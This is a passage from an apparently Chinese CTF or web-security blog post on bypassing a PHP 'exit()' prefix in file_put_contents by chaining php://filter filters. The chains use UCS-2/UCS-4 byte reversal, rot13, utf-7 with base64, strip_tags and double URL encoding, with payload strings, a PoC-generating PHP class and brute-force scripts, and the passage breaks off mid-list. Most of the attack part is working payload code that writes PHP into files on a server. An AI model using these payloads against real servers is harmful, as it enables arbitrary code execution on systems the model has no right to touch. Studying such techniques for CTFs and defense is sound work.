code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><span class="hljs-attribute">UTF7</span>-IMAP<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span><span class="hljs-attribute">ASCII</span><span class="hljs-attribute">EUC</span>-JP<span class="hljs-attribute">SJIS</span><span class="hljs-attribute">eucJP</span>-win<span class="hljs-attribute">SJIS</span>-win<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<span class="hljs-attribute">CP932</span><span class="hljs-attribute">CP51932</span><span class="hljs-attribute">SJIS</span>-mac (alias: MacJapanese)<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO (alias: SJIS-DOCOMO)<span class="hljs-attribute">SJIS</span>-Mobile#KDDI (alias: SJIS-KDDI)<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK (alias: SJIS-SOFTBANK)<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO (alias: UTF-<span class="hljs-number">8</span>-DOCOMO)<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B (alias: UTF-<span class="hljs-number">8</span>-KDDI)<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK (alias: UTF-<span class="hljs-number">8</span>-SOFTBANK)<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI (alias: ISO-<span class="hljs-number">2022</span>-JP-KDDI)<span class="hljs-attribute">JIS</span><span class="hljs-attribute">JIS</span>-ms<span class="hljs-attribute">CP50220</span><span class="hljs-attribute">CP50220raw</span><span class="hljs-attribute">CP50221</span><span class="hljs-attribute">CP50222</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span><span class="hljs-attribute">byte2be</span><span class="hljs-attribute">byte2le</span><span class="hljs-attribute">byte4be</span><span class="hljs-attribute">byte4le</span><span class="hljs-attribute">BASE64</span><span class="hljs-attribute">HTML</span>-ENTITIES (alias: HTML)<span class="hljs-attribute">7bit</span><span class="hljs-attribute">8bit</span><span class="hljs-attribute">EUC</span>-CN<span class="hljs-attribute">CP936</span><span class="hljs-attribute">GB18030</span><span class="hljs-attribute">HZ</span><span class="hljs-attribute">EUC</span>-TW<span class="hljs-attribute">CP950</span><span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span><span class="hljs-attribute">EUC</span>-KR<span class="hljs-attribute">UHC</span> (alias: CP<span class="hljs-number">949</span>)<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span> (alias: CP<span class="hljs-number">1251</span>)<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span> (alias: CP<span class="hljs-number">1252</span>)<span class="hljs-attribute">CP866</span> (alias: IBM<span class="hljs-number">866</span>)<span class="hljs-attribute">KOI8</span>-R<span class="hljs-attribute">KOI8</span>-U<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span> (alias: ArmSCII<span class="hljs-number">8</span>)</code></pre></div><p><strong>通过UCS-2或者UCS-4的方式，对目标字符串进行2/4位一反转，也就是说构造的需要是UCS-2或UCS-4中2或者4的倍数，不然不能进行反转</strong></p><p>构造payload</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">echo</span> iconv(<span class="hljs-string">&quot;UCS-4LE&quot;</span>,<span class="hljs-string">&quot;UCS-4BE&quot;</span>,<span class="hljs-string">&#x27;aa&lt;?php phpinfo();?&gt;&#x27;</span>);?&lt;aa phpiphp(ofn&gt;?;)</code></pre></div><p>payload</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter//convert.iconv.UCS-2LE.UCS-2BE|?&lt;hp phpipfn(o;)&gt;?/resource=Cyc1e.php&#x27;</span>;<span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter//convert.iconv.UCS-4LE.UCS-4BE|xxx?&lt;aa phpiphp(ofn&gt;?;)/resource=Cyc1e.php&#x27;</span>;<span class="hljs-comment">#由于是4位一反转，所以需要保证?&lt;aa phpiphp(ofn&gt;?;)之前字符个数是4的倍数，所以需要补3个字符</span></code></pre></div><h3 id="4-UCS-2组合rot13"><a href="#4-UCS-2组合rot13" class="headerlink" title="4. UCS-2组合rot13"></a>4. UCS-2组合rot13</h3><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;php://filter/write=convert.iconv.UCS-2LE.UCS-2BE|string.rot13|x?&lt;uc cucvcsa(b;)&gt;?/resource=drom.php&#x27;</span>; <span class="hljs-comment">#同样需要补位，这里补了一个x</span></code></pre></div><p>基础poc：</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generate</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$prefix</span> = <span class="hljs-string">&quot;&lt;?php exit();&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc</span> = <span class="hljs-string">&quot;&lt;?php phpinfo();?&gt;&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$base</span> = <span class="hljs-string">&quot;php://filter/write=&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$end</span> = <span class="hljs-string">&quot;/resource=drom.php&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$string</span> = [        <span class="hljs-string">&#x27;rot13&#x27;</span> =&gt; <span class="hljs-string">&#x27;str_rot13&#x27;</span>,        <span class="hljs-string">&#x27;toupper&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtoupper&#x27;</span>,        <span class="hljs-string">&#x27;tolower&#x27;</span> =&gt; <span class="hljs-string">&#x27;strtolower&#x27;</span>,        <span class="hljs-string">&#x27;strip_tags&#x27;</span> =&gt; <span class="hljs-string">&#x27;strip_tags&#x27;</span>,    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$zlib</span> = [        <span class="hljs-string">&#x27;deflate&#x27;</span>,        <span class="hljs-string">&#x27;inflate&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$bzip2</span> = [        <span class="hljs-string">&#x27;compress&#x27;</span>,        <span class="hljs-string">&#x27;decompress&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$convert</span> = [        <span class="hljs-string">&#x27;UCS-4&#x27;</span>,        <span class="hljs-string">&#x27;UCS-4BE&#x27;</span>,        <span class="hljs-string">&#x27;UCS-2&#x27;</span> ,        <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>,        <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32BE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-32LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16BE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-16LE&#x27;</span>,        <span class="hljs-string">&#x27;UTF-7&#x27;</span>,        <span class="hljs-string">&#x27;UTF7-IMAP&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8&#x27;</span>,        <span class="hljs-string">&#x27;ASCII&#x27;</span>,        <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,        <span class="hljs-string">&#x27;SJIS&#x27;</span>,        <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,        <span class="hljs-string">&#x27;CP932&#x27;</span>,        <span class="hljs-string">&#x27;CP51932&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,        <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#DOCOMO&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-A&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#KDDI-B&#x27;</span>,        <span class="hljs-string">&#x27;UTF-8-Mobile#SOFTBANK&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,        <span class="hljs-string">&#x27;JIS&#x27;</span>,        <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,        <span class="hljs-string">&#x27;CP50220&#x27;</span>,        <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,        <span class="hljs-string">&#x27;CP50221&#x27;</span>,        <span class="hljs-string">&#x27;CP50222&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,        <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,        <span class="hljs-string">&#x27;byte2be&#x27;</span>,        <span class="hljs-string">&#x27;byte2le&#x27;</span>,        <span class="hljs-string">&#x27;byte4be&#x27;</span>,        <span class="hljs-string">&#x27;byte4le&#x27;</span>,        <span class="hljs-string">&#x27;BASE64&#x27;</span>,        <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,        <span class="hljs-string">&#x27;7bit&#x27;</span>,        <span class="hljs-string">&#x27;8bit&#x27;</span>,        <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,        <span class="hljs-string">&#x27;CP936&#x27;</span>,        <span class="hljs-string">&#x27;GB18030&#x27;</span>,        <span class="hljs-string">&#x27;HZ&#x27;</span>,        <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,        <span class="hljs-string">&#x27;CP950&#x27;</span>,        <span class="hljs-string">&#x27;BIG-5&#x27;</span>,        <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,        <span class="hljs-string">&#x27;UHC&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,        <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,        <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,        <span class="hljs-string">&#x27;CP866&#x27;</span>,        <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,        <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,        <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc_stack</span> = [        <span class="hljs-string">&#x27;convert&#x27;</span> =&gt; [            <span class="hljs-string">&#x27;from&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,            <span class="hljs-string">&#x27;to&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>        ],        <span class="hljs-string">&#x27;string&#x27;</span> =&gt; <span class="hljs-string">&#x27;rot13&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatConvert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;convert.iconv.&#x27;</span>.<span class="hljs-variable">$convfrom</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$convto</span>.<span class="hljs-string">&#x27;|&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatString</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;string&#x27;</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$stringop</span>.<span class="hljs-string">&#x27;|&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">convert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> iconv(<span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">string</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span>,<span class="hljs-variable">$poc</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;string[<span class="hljs-variable">$stringop</span>](<span class="hljs-variable">$poc</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Run</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;prefix;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;base;        <span class="hljs-variable">$result_poc</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-keyword">$this</span>-&gt;poc_stack) <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$item</span> == <span class="hljs-string">&#x27;string&#x27;</span>)&#123;                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatString(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>]);                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;string(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>],<span class="hljs-keyword">$this</span>-&gt;poc);            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;convert&#x27;</span>)&#123;                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatConvert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>]);                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;convert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc);            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;$zlib&#x27;</span>)&#123;                ;            &#125;        &#125;        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$result</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;length:&quot;</span>,strlen(<span class="hljs-variable">$tmp</span>),<span class="hljs-string">&quot;\n&quot;</span>;        <span class="hljs-variable">$padding</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-string">&#x27;convert&#x27;</span>][<span class="hljs-string">&#x27;from&#x27;</span>])&#123;            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;UCS-2LE&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>:                <span class="hljs-variable">$paddingnum</span> = strlen(<span class="hljs-variable">$tmp</span>)%<span class="hljs-number">2</span>;                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$paddingnum</span> !== <span class="hljs-number">0</span>)&#123;                    <span class="hljs-variable">$padding</span> = str_repeat(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-variable">$paddingnum</span>);                &#125;                <span class="hljs-keyword">break</span>;            <span class="hljs-keyword">default</span>:                ;        &#125;                <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$padding</span>;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;poc;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;end;        <span class="hljs-keyword">echo</span> substr(<span class="hljs-variable">$result</span>,strlen(<span class="hljs-keyword">$this</span>-&gt;prefix)),<span class="hljs-string">&quot;\n&quot;</span>;    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Generate();<span class="hljs-variable">$a</span>-&gt;Run();</code></pre></div><h3 id="5-utf8编码转为utf7配合base64"><a href="#5-utf8编码转为utf7配合base64" class="headerlink" title="5. utf8编码转为utf7配合base64"></a>5. utf8编码转为utf7配合base64</h3><p>前面介绍单独用base64编码是不可行的，那么来一套组合拳是否可以呢？答案肯定是可以的，这里感谢大兄弟<a href="http://yulige.top/">郁离歌</a>提供的方法，通过iconv将utf8编码转为utf7编码，从而把 <strong>=</strong> 给转了，就不会影响到base64的解码了</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php&#x27;</span>; <span class="hljs-comment">#base64编码前补了AA，原理一样，补齐位数</span></code></pre></div><h3 id="6-strip-tags配合base64"><a href="#6-strip-tags配合base64" class="headerlink" title="6. strip_tags配合base64"></a>6. strip_tags配合base64</h3><p>我们来用一下strip_tags方法&amp;&amp;base64的组合，不过之前构造的这种方法有局限性，要求服务器是linux系统，所以之前没写。因为前面介绍过strip_tags去除的是完整的标签以及内容，而base64要求中间不能出现 <code>=</code> 所以把他们二者组合起来</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php&#x27;</span>;</code></pre></div><p>理解起来也很简单，在文件名前加上<code>?&gt;</code>把<code>&lt;?php exit();</code>闭合，同时 = 也在闭合标签之间，所以利用strip_tags处理的时候直接把<code>&lt;?php ...... ?&gt;</code>内的所有内容都删除了，然后对剩下的部分，也就是<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>进行base64解码，为什么说这种构造Windows不行呢，因为Windows不支持文件名中有<code>?</code>、<code>&gt;</code>这类字符</p><h3 id="7-二次编码特性配合过滤器"><a href="#7-二次编码特性配合过滤器" class="headerlink" title="7. 二次编码特性配合过滤器"></a><strong>7. 二次编码特性配合过滤器</strong></h3><p>查看伪协议处理的源码</p><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">php_stream_apply_filter_list</span><span class="hljs-params">(php_stream *stream, <span class="hljs-keyword">char</span> *filterlist, <span class="hljs-keyword">int</span> read_chain, <span class="hljs-keyword">int</span> write_chain)</span> <span class="hljs-comment">/* &#123;&#123;&#123; */</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> *p, *token = <span class="hljs-literal">NULL</span>;php_stream_filter *temp_filter;p = php_strtok_r(filterlist, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);<span class="hljs-keyword">while</span> (p) &#123;php_url_decode(p, <span class="hljs-built_in">strlen</span>(p));#👈对过滤器进行了一次urldecode<span class="hljs-keyword">if</span> (read_chain) &#123;<span class="hljs-keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="hljs-literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter);&#125; <span class="hljs-keyword">else</span> &#123;php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);&#125;&#125;<span class="hljs-keyword">if</span> (write_chain) &#123;<span class="hljs-keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="hljs-literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter);&#125; <span class="hljs-keyword">else</span> &#123;php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);&#125;&#125;p = php_strtok_r(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);&#125;&#125;</code></pre></div><p>file_put_contents中可以调用伪协议，而<strong>伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的</strong>，不过我们在服务端ban了%25（用%25太简单了）所以测试%25被ban后就可以写个脚本跑一下字符，构造一些过滤的字符就可以利用正常的姿势绕过。知道可以用二次编码绕过了，可以简单构造一下参见的payload即可，可参考我之前写的文章中的一些payload</p><p>url二次编码脚本</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$char</span> = <span class="hljs-string">&#x27;r&#x27;</span>; <span class="hljs-comment">#构造r的二次编码</span><span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii1</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii1</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii1</span>++) &#123;<span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii2</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii2</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii2</span>++) &#123;<span class="hljs-variable">$aaa</span> = <span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii1</span>.<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii2</span>;<span class="hljs-keyword">if</span>(urldecode(urldecode(<span class="hljs-variable">$aaa</span>)) == <span class="hljs-variable">$char</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$char</span>.<span class="hljs-string">&#x27;: &#x27;</span>.<span class="hljs-variable">$aaa</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;&#125;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>使用burp也是一样的。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906195755600.png" alt="image-20200906195755600"></p><h3 id="8-zlib-deflate与zlib-inflate结合其他过滤器"><a href="#8-zlib-deflate与zlib-inflate结合其他过滤器" class="headerlink" title="8. zlib.deflate与zlib.inflate结合其他过滤器"></a>8. zlib.deflate与zlib.inflate结合其他过滤器</h3><ul><li>zlib.deflate与zlib.inflate结合之后内容肯定不变，我们只需要在其中加入别的过滤器，即可</li><li>在wmctf中，zlib.deflate与zlib.inflate中间加入string.tolower过滤器会使&lt;?php exit(); 变成&lt;?php@�xit()无法解析。</li></ul><p>尝试脚本</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = [    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,    <span class="hljs-string">&#x27;ASCII&#x27;</span>,    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,    <span class="hljs-string">&#x27;SJIS&#x27;</span>,    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,    <span class="hljs-string">&#x27;CP932&#x27;</span>,    <span class="hljs-string">&#x27;CP51932&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;JIS&#x27;</span>,    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,    <span class="hljs-string">&#x27;CP50220&#x27;</span>,    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,    <span class="hljs-string">&#x27;CP50221&#x27;</span>,    <span class="hljs-string">&#x27;CP50222&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,    <span class="hljs-string">&#x27;byte2be&#x27;</span>,    <span class="hljs-string">&#x27;byte2le&#x27;</span>,    <span class="hljs-string">&#x27;byte4be&#x27;</span>,    <span class="hljs-string">&#x27;byte4le&#x27;</span>,    <span class="hljs-string">&#x27;BASE64&#x27;</span>,    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,    <span class="hljs-string">&#x27;7bit&#x27;</span>,    <span class="hljs-string">&#x27;8bit&#x27;</span>,    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,    <span class="hljs-string">&#x27;CP936&#x27;</span>,    <span class="hljs-string">&#x27;GB18030&#x27;</span>,    <span class="hljs-string">&#x27;HZ&#x27;</span>,    <span 